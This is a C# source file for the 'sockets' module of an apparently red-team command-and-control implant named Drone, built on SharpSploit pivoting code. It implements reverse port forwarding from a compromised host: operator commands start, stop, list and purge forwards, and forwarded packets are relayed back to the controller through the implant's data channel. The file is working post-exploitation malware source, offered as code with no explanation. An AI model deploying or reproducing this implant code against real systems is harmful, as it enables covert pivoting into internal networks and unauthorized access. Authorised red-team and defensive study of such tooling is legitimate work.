using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;

using Drone.Models;
using Drone.Modules;
using Drone.SharpSploit.Generic;
using Drone.SharpSploit.Pivoting;

namespace Drone
{
    public class SocketModule : DroneModule
    {
        public override string Name => "sockets";

        public override List<Command> Commands => new List<Command>
        {
            new("start-rportfwd", "Start a new reverse port forward", Start, new List<Command.Argument>
            {
                new("bindPort", false),
                new("forwardHost", false),
                new("forwardPort", false),
            }),
            new("stop-rportfwd", "Stop a reverse port forward", Stop, new List<Command.Argument>
            {
                new("bindPort", false)
            }),
            new("list-rportfwds", "List all active reverse port forwards", List),
            new("purge-rportfwd", "Purge all active reverse port forwards", Purge),
            new("rportfwd-inbound", "", HandleInboundResponse, visible: false)
        };
        
        private readonly SharpSploitResultList<ReversePortForward> _forwards = new();

        private void Stop(DroneTask task, CancellationToken token)
        {
            if (!int.TryParse(task.Arguments[0], out var bindPort))
            {
                Drone.SendError(task.TaskGuid, "Not a valid bind port.");
                return;
            }

            var rportfwd = GetReversePortForward(bindPort);
            rportfwd?.Stop();
            
            _forwards.Remove(rportfwd);
        }

        private void Start(DroneTask task, CancellationToken token)
        {
            if (!int.TryParse(task.Arguments[0], out var bindPort))
            {
                Drone.SendError(task.TaskGuid, "Not a valid bind port.");
                return;
            }

            if (!int.TryParse(task.Arguments[2], out var forwardPort))
            {
                Drone.SendError(task.TaskGuid, "Not a valid forward port.");
                return;
            }

            var rportfwd = new ReversePortForward(bindPort, task.Arguments[1], forwardPort);

            var t = new Thread(() => rportfwd.Start());
            t.Start();
            
            _forwards.Add(rportfwd);

            while (!token.IsCancellationRequested)
            {
                if (rportfwd.GetData(out var packet))
                {
                    Drone.SendDroneData(task.TaskGuid, "rportfwd", packet.Serialize());
                }
                
                Thread.Sleep(100);
            }
        }
        
        private void List(DroneTask task, CancellationToken token)
        {
            var list = _forwards.ToString();
            Drone.SendResult(task.TaskGuid, list);
        }
        
        private void Purge(DroneTask task, CancellationToken token)
        {
            foreach (var forward in _forwards) forward.Stop();
            _forwards.Clear();
        }
        
        private void HandleInboundResponse(DroneTask task, CancellationToken token)
        {
            var bindPort = int.Parse(task.Arguments[0]);
            var data = Convert.FromBase64String(task.Arguments[1]);

            var rportfwd = GetReversePortForward(bindPort);
            rportfwd?.SendData(data);
        }

        private ReversePortForward GetReversePortForward(int bindPort)
            => _forwards.SingleOrDefault(r => r.BindPort == bindPort);
    }
}